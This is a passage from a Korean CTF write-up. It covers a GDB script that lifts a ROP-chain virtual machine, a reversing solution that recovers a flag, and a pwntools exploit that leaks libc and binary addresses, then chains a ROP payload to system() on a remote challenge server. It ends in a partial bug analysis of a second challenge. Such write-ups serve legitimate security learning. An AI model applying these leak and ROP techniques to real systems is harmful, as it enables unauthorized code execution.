stack[idx] = rsp ; rsp = rax\u0026#39;) reg_state[\u0026#39;rsp\u0026#39;] = ambig elif addr == gads[12]: if not const_1: if reg_state[\u0026#39;rbp\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: mov rsp, {(rbp)} ; pop rbp\u0026#39;) else: if start+i*8 == 0x34785438: print(\u0026#39;-------- function_4() ---------\u0026#39;) print(f\u0026#39;{hex(start+i*8)}: mov rsp, rbp ; pop rbp\u0026#39;) if reg_state[\u0026#39;rbp\u0026#39;] \u0026amp; confi: rsp = rbp reg_state[\u0026#39;rsp\u0026#39;] = confi reg_state[\u0026#39;rbp\u0026#39;] = ambig rbp = 0xdeadbeef elif addr == gads[13]: if not const_1: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: r8d = eax; eax = r8d\u0026#39;) r8 = rax \u0026amp;0xffffffff rax = r8 reg_state[\u0026#39;r8\u0026#39;] = confi else: print(f\u0026#39;{hex(start+i*8)}: r8d = eax; eax = r8d\u0026#39;) r8 = 0xdeadbeef rax = r8 reg_state[\u0026#39;r8\u0026#39;] = ambig elif addr == gads[14]: if not const_1: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: rax -= 1 // rax = {rax} - 1\u0026#39;) rax -= 1 rax \u0026amp;=0xffffffffffffffff else: print(f\u0026#39;{hex(start+i*8)}: rax -= 1\u0026#39;) rax = 0xdeadbeef reg_state[\u0026#39;rax\u0026#39;] = ambig elif addr == gads[15]: if rdx not in variables.keys() and reg_state[\u0026#39;rdx\u0026#39;] \u0026amp;confi: varname = hex(rdx).replace(\u0026#39;0x\u0026#39;,\u0026#39;\u0026#39;) variables[rdx] = f\u0026#39;var_{varname}\u0026#39; if not const_1: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: if reg_state[\u0026#39;rdx\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: (QWORD){variables[rdx]} = {rax}\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: *(QWORD *)(rdx) = {rax}\u0026#39;) elif reg_state[\u0026#39;rdx\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: *(QWORD *)({variables[rdx]}) = rax\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: *(QWORD *)(rdx) = rax\u0026#39;) # must write memory elif addr == gads[16]: if rsi not in variables.keys() and reg_state[\u0026#39;rsi\u0026#39;] \u0026amp;confi: varname = hex(rsi).replace(\u0026#39;0x\u0026#39;,\u0026#39;\u0026#39;) variables[rsi] = f\u0026#39;var_{varname}\u0026#39; if not const_1: if reg_state[\u0026#39;rsi\u0026#39;] \u0026amp; confi: if reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: (QWORD)({variables[(rsi)]}) = {rdi}\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: (QWORD)({variables[(rsi)]}) = rdi\u0026#39;) elif reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: *(QWORD *)(rsi) = {rdi}\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: *(QWORD *)(rsi) = rdi\u0026#39;) # must write memory elif addr == gads[17]: if not const_1: if reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: if (rdi+0x18) in variables: print(f\u0026#39;{hex(start+i*8)}: rax -= (QWORD)({variables[rdi+0x18]})\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: rax -= *(QWORD *)({rdi+0x18})\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: rax -= *(QWORD *)(rdi+0x18)\u0026#39;) reg_state[\u0026#39;rax\u0026#39;] = ambig rax = 0xdeadbeef elif addr == gads[18]: if not const_1: print(f\u0026#39;{hex(start+i*8)}: rbx = {chains[i+1]}\u0026#39;) reg_state[\u0026#39;rbx\u0026#39;] = confi rbx = chains[i+1] i += 1 elif addr == gads[19]: if not const_1: print(f\u0026#39;{hex(start+i*8)}: rax += rbx ; rbx = {chains[i+1]} ; rbp = {chains[i+2]} ; r12 = {chains[i+3]} ; r13 = {chains[i+4]}\u0026#39;) rax += rbx rax \u0026amp;= 0xffffffffffffffff rbx = chains[i+1] rbp = chains[i+2] r12 = chains[i+3] r13 = chains[i+4] reg_state[\u0026#39;rbx\u0026#39;] = confi reg_state[\u0026#39;rbp\u0026#39;] = confi reg_state[\u0026#39;r12\u0026#39;] = confi reg_state[\u0026#39;r13\u0026#39;] = confi i += 4 elif addr == gads[20]: if not const_1: print(f\u0026#39;{hex(start+i*8)}: rcx = {chains[i+1]}\u0026#39;) rcx = chains[i+1] reg_state[\u0026#39;rcx\u0026#39;] = confi i += 1 elif addr == gads[21]: if rdi not in variables.keys() and reg_state[\u0026#39;rdi\u0026#39;] \u0026amp;confi: varname = hex(rdi).replace(\u0026#39;0x\u0026#39;,\u0026#39;\u0026#39;) variables[rdi] = f\u0026#39;var_{varname}\u0026#39; if not const_1: if reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: rax \u0026lt;\u0026lt;= cl ; (QWORD)({variables[rdi]}) |= rax ; eax = 0\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: rax \u0026lt;\u0026lt;= cl ; *(QWORD *)(rdi) |= rax ; eax = 0\u0026#39;) rax \u0026lt;\u0026lt;= (rcx\u0026amp;0xff) reg_state[\u0026#39;rax\u0026#39;] = confi rax = 0 \\#mem accesss needed elif addr == gads[22]: if rax not in variables.keys() and reg_state[\u0026#39;rax\u0026#39;] \u0026amp;confi: varname = hex(rax).replace(\u0026#39;0x\u0026#39;,\u0026#39;\u0026#39;) variables[rax] = f\u0026#39;var_{varname}\u0026#39; if not const_1: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: (DWORD)({variables[rax]}) += 1\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: *(DWORD *)(rax) += 1\u0026#39;) elif addr == gads[23]: if not const_1: print(f\u0026#39;{hex(start+i*8)}: invalid ops\u0026#39;) elif addr == gads[24]: if not const_1: if reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: rax += {rdi}\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: rax += rdi\u0026#39;) if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi and reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: rax += rdi rax \u0026amp;= 0xffffffffffffffff elif addr == gads[25]: if not const_1: print(f\u0026#39;{hex(start+i*8)}: rax \u0026gt;\u0026gt;= 6\u0026#39;) if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: rax \u0026gt;\u0026gt;= 6 else: rax = 0xdeadbeef elif addr == gads[26]: if not const_1: if reg_state[\u0026#39;rdx\u0026#39;] \u0026amp; confi: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: *(BYTE *)({rdx}) = {rax\u0026amp;0xff} ; rax = rdi\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: *(BYTE *)({rdx}) = rax ; rax = rdi\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: *(BYTE *)(rdx) = rax ; rax = rdi\u0026#39;) if reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: reg_state[\u0026#39;rax\u0026#39;] = confi rax = rdi else: rax = 0xdeadbeef # memory access needed rax = rdi elif addr == gads[27]: if not const_1: print(f\u0026#39;{hex(start+i*8)}: eax *= 2\u0026#39;) if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: rax *= 2 rax \u0026amp;=0xffffffff else: rax = 0xdeadbeef elif addr == gads[28]: # more if not const_1: print(f\u0026#39;{hex(start+i*8)}: rsp = stack[idx] ; idx -= 1\u0026#39;) elif addr == gads[29]: if not const_1: print(f\u0026#39;{hex(start+i*8)}: xchg edi, eax\u0026#39;) if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi and reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: tmp = rdi\u0026amp;0xffffffff rdi = rax\u0026amp;0xffffffff rax = tmp elif addr == gads[30]: if not const_1: print(f\u0026#39;{hex(start+i*8)}: eax \u0026lt;\u0026lt;= 0x17 ; ecx |= eax\u0026#39;) if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi : rax \u0026lt;\u0026lt;= 0x17 rax \u0026amp;=0xffffffff if reg_state[\u0026#39;rcx\u0026#39;] \u0026amp; conf : rcx |= (rax\u0026amp;0xffffffff) else: rcx = 0xdeadbeef else: rax = 0xdeadbeef else: print(\u0026#39;GG\u0026#39;) exit() i = 0 while i \u0026lt; len(chains): ele = chains[i] if \u0026#39;r-x\u0026#39; in gdb.execute(f\u0026#39;xinfo {ele}\u0026#39;,to_string=True): process(ele) # break else: pass print(f\u0026#39;{hex(start+i*8)}: {hex(ele)}\u0026#39;) i += 1 나름대로 레지스터들의 상태를 기록하고 그 시점에 연산이 가능한지 아닌지에 대해서 판단을 해서, 연산이 가능하면 주석으로 그 결과를 표시한다. 시스템 콜의 번호들도 그 시점에 연산이 가능한 경우 직접 sys_read 같은 시스템 콜로 래핑해서 출력한다.\nchains ready -------- main() --------- 0x34785000: rdx = 23 ; r12 = 0 0x34785018: rsi = 93966797815905 0x34785028: rdi = 1 0x34785038: rax = 1 0x34785048: sys_write(1, 0x5576599ac061, 23) // \u0026#34;Simple Base64 Encoder!\\n\u0026#34; 0x34785050: rdx = 29 ; r12 = 0 0x34785068: rsi = 93966797815950 0x34785078: rdi = 1 0x34785088: rax = 1 0x34785098: sys_write(1, 0x5576599ac08e, 29) // \u0026#34;1. Encode\\n2. Print\\n3. Exit\\n\u0026gt; \u0026#34; 0x347850a0: rdx = 2 ; r12 = 0 0x347850b8: rsi = 93966797857408 0x347850c8: rdi = 0 0x347850d8: rax = 0 0x347850e8: sys_read(0, buf_5576599b6280, 2) 0x347850f0: rdi = 2609 0x34785100: rax = 93966797857408 0x34785110: rax = (QWORD)(buf_5576599b6280) 0x34785118: rsi = 65535 0x34785128: eax \u0026amp;= esi // eax \u0026amp;= 65535 0x34785130: rax -= rdi // rax -= 2609 0x34785138: rax = 880300432 0x34785148: rdx = 880300944 ; r12 = 0 0x34785160: if true -\u0026gt; rax = 0x34785390 else -\u0026gt; rax = 0x34785190 0x34785168: rdx = 0 ; r12 = 4294967295 이런식으로 결과가 출력된다.\nRev sol 0x34788db8: rdx = 880315912 ; r12 = 0 0x34788dd0: if true -\u0026gt; rax = 0x34788e08 else -\u0026gt; rax = 0x3478a218 0x34788dd8: rdx = 0 ; r12 = 4294967295 0x34788df0: rdx |= rax 0x34788df8: rsp = rdx 0x34788e00: invalid ops 0x34788e08: rax = 93966797857408 0x34788e18: rbx = 41 0x34788e28: rax += rbx ; rbx = 93966797857408 ; rbp = 0 ; r12 = 0 ; r13 = 4294967295 0x34788e50: rax = *(QWORD *)(rax) // *(QWORD *)0x5576599b62a9 0x34788e58: rsi = 255 0x34788e68: eax \u0026amp;= esi // eax \u0026amp;= 255 0x34788e70: rdi = 414588904 0x34788e80: xchg edi, eax 0x34788e88: rax \u0026gt;\u0026gt;= 6 0x34788e90: rsi = 255 0x34788ea0: rax \u0026gt;\u0026gt;= 6 0x34788ea8: eax \u0026amp;= esi // eax \u0026amp;= 255 0x34788eb0: xchg edi, eax 0x34788eb8: rax -= rdi // rax -= 414588904 0x34788ec0: rax = 880321048 0x34788ed0: rdx = 880316192 ; r12 = 0 0x34788ee8: if true -\u0026gt; rax = 0x34788f20 else -\u0026gt; rax = 0x3478a218 0x34788ef0: rdx = 0 ; r12 = 4294967295 0x34788f08: rdx |= rax 0x34788f10: rsp = rdx 0x34788f18: invalid ops 0x34788f20: rax = 93966797857408 0x34788f30: rbx = 42 0x34788f40: rax += rbx ; rbx = 93966797857408 ; rbp = 0 ; r12 = 0 ; r13 = 4294967295 0x34788f68: rax = *(QWORD *)(rax) // *(QWORD *)0x5576599b62aa 0x34788f70: rsi = 255 0x34788f80: eax \u0026amp;= esi // eax \u0026amp;= 255 0x34788f88: eax *= 2 0x34788f90: eax *= 2 0x34788f98: rdi = 392 0x34788fa8: rax -= rdi // rax -= 392 0x34788fb0: rax = 880321048 0x34788fc0: rdx = 880316432 ; r12 = 0 0x34788fd8: if true -\u0026gt; rax = 0x34789010 else -\u0026gt; rax = 0x3478a218 0x34788fe0: rdx = 0 ; r12 = 4294967295 0x34788ff8: rdx |= rax 0x34789000: rsp = rdx 0x34789008: invalid ops 0x34789010: rax = 93966797857408 0x34789020: rbx = 43 0x34789030: rax += rbx ; rbx = 93966797857408 ; rbp = 0 ; r12 = 0 ; r13 = 4294967295 0x34789058: rax = *(QWORD *)(rax) // *(QWORD *)0x5576599b62ab 0x34789060: rsi = 255 0x34789070: eax \u0026amp;= esi // eax \u0026amp;= 255 0x34789078: rdi = 912316478 0x34789088: xchg edi, eax 0x34789090: rsi = 4286578688 0x347890a0: eax \u0026amp;= esi // eax \u0026amp;= 4286578688 0x347890a8: xchg edi, eax 0x347890b0: eax \u0026lt;\u0026lt;= 0x17 ; ecx |= eax 0x347890b8: rax -= rdi // rax -= 912316478 0x347890c0: rax = 880321048 0x347890d0: rdx = 880316704 ; r12 = 0 0x347890e8: if true -\u0026gt; rax = 0x34789120 else -\u0026gt; rax = 0x3478a218 0x347890f0: rdx = 0 ; r12 = 4294967295 0x34789108: rdx |= rax 0x34789110: rsp = rdx 0x34789118: invalid ops 0x34789120: rax = 93966797857408 0x34789130: rbx = 44 0x34789140: rax += rbx ; rbx = 93966797857408 ; rbp = 0 ; r12 = 0 ; r13 = 4294967295 0x34789168: rax = *(QWORD *)(rax) // *(QWORD *)0x5576599b62ac 0x34789170: rsi = 255 0x34789180: eax \u0026amp;= esi // eax \u0026amp;= 255 0x34789188: rdi = 1699151259 0x34789198: xchg edi, eax 0x347891a0: rax \u0026gt;\u0026gt;= 6 0x347891a8: rsi = 255 0x347891b8: rax \u0026gt;\u0026gt;= 6 0x347891c0: eax \u0026amp;= esi // eax \u0026amp;= 255 0x347891c8: xchg edi, eax 0x347891d0: rax -= rdi // rax -= 1699151259 0x347891d8: rax = 880321048 0x347891e8: rdx = 880316984 ; r12 = 0 0x34789200: if true -\u0026gt; rax = 0x34789238 else -\u0026gt; rax = 0x3478a218 0x34789208: rdx = 0 ; r12 = 4294967295 0x34789220: rdx |= rax 0x34789228: rsp = rdx 0x34789230: invalid ops 0x34789238: rax = 93966797857408 0x34789248: rbx = 45 0x34789258: rax += rbx ; rbx = 93966797857408 ; rbp = 0 ; r12 = 0 ; r13 = 4294967295 0x34789280: rax = *(QWORD *)(rax) // *(QWORD *)0x5576599b62ad 0x34789288: rsi = 255 0x34789298: eax \u0026amp;= esi // eax \u0026amp;= 255 0x347892a0: eax *= 2 0x347892a8: eax *= 2 0x347892b0: rdi = 500 0x347892c0: rax -= rdi // rax -= 500 0x347892c8: rax = 880321048 0x347892d8: rdx = 880317224 ; r12 = 0 0x347892f0: if true -\u0026gt; rax = 0x34789328 else -\u0026gt; rax = 0x3478a218 0x347892f8: rdx = 0 ; r12 = 4294967295 0x34789310: rdx |= rax 0x34789318: rsp = rdx 0x34789320: invalid ops 0x34789328: rsi = 93966797856896 0x34789338: rdi = 1095002458 0x34789348: xchg edi, eax 0x34789350: rax \u0026gt;\u0026gt;= 6 0x34789358: rax \u0026gt;\u0026gt;= 6 0x34789360: rax \u0026gt;\u0026gt;= 6 0x34789368: rax \u0026gt;\u0026gt;= 6 0x34789370: xchg edi, eax 0x34789378: (QWORD)(var_5576599b6080) = 1095002458 0x34789380: rdi = 1 0x34789390: rdx = 1 ; r12 = 0 0x347893a8: rax = 1 0x347893b8: sys_write(1, 0x5576599b6080, 1) // \u0026#34;\\n\u0026#34; 리버싱같은 경우에는 마지막에 검증 로직이 한글자씩 박혀있어서 이를 연산하면 구할 수 있다.\nRev sol script def encode(input): output = \u0026#39;\u0026#39; table = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34; padding = \u0026#39;QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB\u0026#39; input = input.encode() for i in range(len(input)//3): r = input[i*3:i*3+3] tmp = (r[0] \u0026lt;\u0026lt; 16) | (r[1] \u0026lt;\u0026lt; 8) | (r[2] \u0026lt;\u0026lt; 0) for j in range(3,-1,-1): output += table[(tmp\u0026gt;\u0026gt;(6*j))\u0026amp;63] output += padding[len(input):] return output print(encode(\u0026#39;ABCABCABC\u0026#39;)) # AUTH START 0x34786168 FLAG = [0 for i in range(100)] FLAG[0] = 160 // 2 FLAG[1] = 320 // 2 // 2 FLAG[2] = 0x27800000 \u0026gt;\u0026gt; 0x17 FLAG[3] = 3926177678 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt; 6 FLAG[3] \u0026amp;= 0xff FLAG[4] = 260 //2 //2 FLAG[5] = (1039200116 \u0026amp; 4286578688) \u0026gt;\u0026gt; 0x17 FLAG[6] = 684128790 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt; 6 FLAG[6] \u0026amp;= 0xff FLAG[7] = 428//2//2 FLAG[8] = (4286578688\u0026amp;799156286) \u0026gt;\u0026gt; 0x17 FLAG[9] = 1578560217 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt; 6 FLAG[9] \u0026amp;= 0xff FLAG[10] = 444//2 //2 FLAG[11] = (1002022558\u0026amp;4286578688) \u0026gt;\u0026gt; 0x17 FLAG[12] = 2256925353 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt; 6 FLAG[12] \u0026amp;= 0xff FLAG[13] = 444 // 2 // 2 FLAG[14] = (941616977 \u0026amp; 4286578688) \u0026gt;\u0026gt; 0x17 FLAG[15] = 3418772988 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt; 6 FLAG[16] \u0026amp;= 0xff FLAG[17] = 440 // 2// 2 FLAG[18] = (797988891\u0026amp;4286578688) \u0026gt;\u0026gt; 0x17 FLAG[19] = 1995915979 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt; 6 FLAG[19] \u0026amp;= 0xff FLAG[20] = 416 // 2// 2 FLAG[21] = (848734036\u0026amp;4286578688) \u0026gt;\u0026gt; 0x17 FLAG[22] = 3608542792 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt; 6 FLAG[22] \u0026amp;= 0xff FLAG[23] = 412 // 2// 2 FLAG[24] = (4286578688 \u0026amp; 816513309) \u0026gt;\u0026gt; 0x17 FLAG[25] = 3969338450 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt; 6 FLAG[25] \u0026amp;= 0xff FLAG[26] = 404 // 2//2 FLAG[27] = (802522653\u0026amp;4286578688) \u0026gt;\u0026gt; 0x17 FLAG[28] = 3063290591 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt; 6 FLAG[29] \u0026amp;= 0xff FLAG[30] = 440 //2 //2 FLAG[31] = (843560064\u0026amp;4286578688) \u0026gt;\u0026gt; 0x17 FLAG[32] = 2364930504 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt;6 FLAG[32] \u0026amp;= 0xff FLAG[33] = 428 // 2//2 FLAG[34] = (883494366\u0026amp;4286578688) \u0026gt;\u0026gt; 0x17 FLAG[35] = 927384544\u0026gt;\u0026gt; 6\u0026gt;\u0026gt; 6 FLAG[35] \u0026amp;= 0xff FLAG[36] = 432 // 2 // 2 FLAG[37] = (805135607\u0026amp;4286578688) \u0026gt;\u0026gt; 0x17 FLAG[38] = 2395425389 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt; 6 FLAG[39] \u0026amp;= 0xff FLAG[40] = 416 // 2// 2 FLAG[41] = (851439545 \u0026amp; 4286578688) \u0026gt;\u0026gt; 0x17 FLAG[42] = 4091936035 \u0026gt;\u0026gt; 6\u0026gt;\u0026gt; 6 FLAG[42] \u0026amp;=0xff FLAG[43] = 400//2//2 FLAG[44] = (888487573\u0026amp;4286578688) \u0026gt;\u0026gt; 0x17 FLAG[45] = 414588904 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt; 6 FLAG[45] \u0026amp;= 0xff FLAG[46] = 392 //2 //2 FLAG[47] = (912316478\u0026amp;286578688) \u0026gt;\u0026gt; 0x17 FLAG[48] = 1699151259 \u0026gt;\u0026gt; 6\u0026gt;\u0026gt;6 FLAG[48] \u0026amp;= 0xff for i in FLAG: print(chr(i),end=\u0026#39;\u0026#39;) # POKA{ok_now_open_the_gate_and_kill_the_diablo} Exploitation 0x347853c0: rsp = rdx // rsp = main+0x70 // back to menu -------- print() --------- 0x347853c8: rax = 880321056 0x347853d8: inc idx ; stack[idx] = rsp ; rsp = 0x3478a220 0x347853e0: rdx = 880300912 ; r12 = 0 0x347853f8: rsp = rdx // rsp = main+0x70 // back to menu -------- exit() --------- 0x34785400: rax = 880301120 0x34785410: inc idx ; stack[idx] = rsp ; rsp = 0x34785440 0x34785418: rdx = 880300912 ; r12 = 0 0x34785430: rsp = rdx // rsp = main+0x70 // back to menu -------- function_4() --------- 0x34785438: mov rsp, rbp ; pop rbp -------- exit_internal() --------- 0x34785440: rdx = 16 ; r12 = 0 0x34785458: rsi = 93966797815986 0x34785468: rdi = 1 0x34785478: rax = 1 0x34785488: sys_write(1, 0x5576599ac0b2, 16) // \u0026#34;really? \u0026lt;y/n\u0026gt;\\n\u0026gt; \u0026#34; 0x34785490: rdi = 0 0x347854a0: rsi = 93966797857408 0x347854b0: rdx = 2 ; r12 = 0 0x347854c8: rax = 0 0x347854d8: sys_read(0, buf_5576599b6280, 2) 0x347854e0: rdi = 2681 0x347854f0: rax = 93966797857408 mov rsp, rbp ; pop rbp는 DOS 취약점으로 이어질 수 있다.\n-------- function_4() --------- 0x34785438: mov rsp, rbp ; pop rbp -------- exit_internal() --------- 0x34785440: rdx = 16 ; r12 = 0 0x34785458: rsi = 93966797815986 0x34785468: rdi = 1 0x34785478: rax = 1 0x34785488: sys_write(1, 0x5576599ac0b2, 16) // \u0026#34;really? \u0026lt;y/n\u0026gt;\\n\u0026gt; \u0026#34; 0x34785490: rdi = 0 0x347854a0: rsi = 93966797857408 0x347854b0: rdx = 2 ; r12 = 0 0x347854c8: rax = 0 0x347854d8: sys_read(0, buf_5576599b6280, 2) 0x347854e0: rdi = 2681 0x347854f0: rax = 93966797857408 0x34785500: rax = (QWORD)(buf_5576599b6280) 0x34785508: rsi = 65535 0x34785518: eax \u0026amp;= esi // eax \u0026amp;= 65535 0x34785520: rax -= rdi // rax -= 2681 0x34785528: rax = 880300112 0x34785538: rdx = 880301408 ; r12 = 0 0x34785550: if true -\u0026gt; rax = 0x34785560 else -\u0026gt; rax = 0x34785050 0x34785558: inc idx ; stack[idx] = rsp ; rsp = rax 0x34785560: rdx = 5 ; r12 = 0 0x34785578: rsi = 93966797815980 0x34785588: rdi = 1 0x34785598: rax = 1 0x347855a8: sys_write(1, 0x5576599ac0ac, 5) // \u0026#34;Bye~\\n\u0026#34; 0x347855b0: rdi = 0 0x347855c0: rax = 60 0x347855d0: sys_exit(0) exit internal을 확인해보면, y/n에 따라 복귀 주소를 저장해놓는다. stack[idx]에 대한 검증이 미흡해 OoB가 가능하다.\n0x34785000: rdx = 23 ; r12 = 0 0x34785018: rsi = 93966797815905 0x34785028: rdi = 1 0x34785038: rax = 1 0x34785048: sys_write(1, 0x5576599ac061, 23) // \u0026#34;Simple Base64 Encoder!\\n\u0026#34; 이러한 가젯들이 존재했는데, 이때 rdx는 나중에 대입된다. 그러면 rdx 쪽 instruction을 건너뛰면, rdx는 잠재적으로 조작될 수 있다. 이를 이용해 .rodata 섹션부터 쭉 메모리를 덤프해서 leak을 달성할 수 있다.\nExploit script from pwn import * import tqdm # p = process(\u0026#39;./lor\u0026#39;,env={\u0026#34;LD_PRELOAD\u0026#34;:\u0026#39;./libc.so.6\u0026#39;}) libc = ELF(\u0026#39;./libc.so.6\u0026#39;) p = remote(\u0026#39;host3.dreamhack.games\u0026#39;,14676) for i in tqdm.tqdm(range(0x1040//2)): p.sendlineafter(b\u0026#39;\u0026gt;\u0026#39;,b\u0026#39;3\u0026#39;) p.sendlineafter(b\u0026#39;really\u0026#39;,b\u0026#39;n\u0026#39;) \u0026#39;\u0026#39;\u0026#39; 0x34785000: rdx = 23 ; r12 = 0 0x34785018: rsi = 93966797815905 0x34785028: rdi = 1 0x34785038: rax = 1 0x34785048: sys_write(1, 0x5576599ac061, 23) // \u0026#34;Simple Base64 Encoder!\\n\u0026#34; \u0026#39;\u0026#39;\u0026#39; p.sendlineafter(b\u0026#39;\u0026gt;\u0026#39;,b\u0026#39;1\u0026#39;) payload = p64(0x34785018) * 4 pause() p.sendlineafter(b\u0026#39;: \u0026#39;,payload) rvu = lambda x : p.recvuntil(x) l = 0 tar = 8103 while l \u0026lt; tar: l += len(p.recv(tar-l)) rv = p.recv() if l \u0026lt; 0x40: rv += p.recv() stdout_ = (u64(rv[0x38:0x38+8])) print(hex(stdout_)) libc_base = stdout_ - libc.sym._IO_2_1_stdout_ success(hex(libc_base)) bin_base = (u64(rv[:8])) -0x12008 success(hex(bin_base)) p.sendlineafter(b\u0026#39;\u0026gt;\u0026#39;,b\u0026#39;1\u0026#39;) payload = p64(bin_base + 0x1A280+0x10) * 2 payload += p64(libc_base + 0x000000000002a3e5) payload += p64(libc_base + 0x1d8698) payload += p64(libc_base + libc.sym.system) pause() p.sendafter(b\u0026#39;input: \u0026#39;,payload) p.interactive() # POKA{now_you_are_the_only_diablo!!rule_the_world} Broken Dahun\u0026rsquo;s Heart Analysis setvbuf(stdout, 0LL, 2, 0LL); print_hi(); alarm(300u); init_handles(); random = 0; fd = open(\u0026#34;/dev/urandom\u0026#34;, 0); read(fd, \u0026amp;random, 2uLL); // bruteforcable close(fd); srand(random); memset(\u0026amp;s, 0, sizeof(s)); s.sa_flags = 4; s.sa_handler = (__sighandler_t)heal_the_borken_heart;// only called once sigaction(SIGSEGV, \u0026amp;s, 0LL); // Sigsegv memset(\u0026amp;s, 0, sizeof(s)); s.sa_flags = 4; s.sa_handler = (__sighandler_t)exit_handler; sigaction(SIGALRM, \u0026amp;s, 0LL); v3 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;( \u0026amp;std::cout, \u0026#34;We should not let this stupid misunderstanding get in our way. We deserve another chance.\u0026#34;); ((void (__fastcall *)(__int64, void *))std::ostream::operator\u0026lt;\u0026lt;)(v3, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); try_again(); } 마찬가지로 enum을 정의해서 쓰면된다.\nucontext_t *__fastcall heal_the_borken_heart(int a1, siginfo_t *a2, ucontext_t *ctx) { ucontext_t *result; // rax if ( check \u0026gt; 1 ) exit(255); ++check; result = ctx; ctx-\u0026gt;uc_mcontext.gregs[0x10] = broken_heart_handlers[game_step]; return result; // rip = handler } // 한번에 한하여 heal_the_broken_heart 함수를 호출하며 context가 복구된다.\nstd::ostream::operator\u0026lt;\u0026lt;(v4, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); v5 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;5. PROPOSE\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v5, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;\u0026gt; \u0026#34;); std::operator\u0026gt;\u0026gt;\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cin, nptr); switch ( atoi(nptr) ) { case 1: // money int bug mildang(); // OoB random add or sub break; case 2: call(); // charming down break; case 3: sms(); // info leak / money unsigned break; case 4: date(); // money unsigned break; case 5: propose(); break; default: return __readfsqword(0x28u) ^ v8; } return __readfsqword(0x28u) ^ v8; } // get Exploitation std::ostream::operator\u0026lt;\u0026lt;(v2, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); } std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Choose: \u0026#34;); std::istream::operator\u0026gt;\u0026gt;(\u0026amp;std::cin, \u0026amp;choice); if ( i \u0026lt; choice || !sms_list[choice] ) // choice Oob broke_again(); f = rand(); val = rand(); v9 = rand(); money -= v9 % 5000; if ( (f \u0026amp; 1) != 0 ) { love_gauge -= f % 10; charming -= val % 10; v3 = mildang_gauge[choice] - (unsigned __int8)val; } else { love_gauge += f % 10; charming += val % 10; v3 = (unsigned __int8)val + 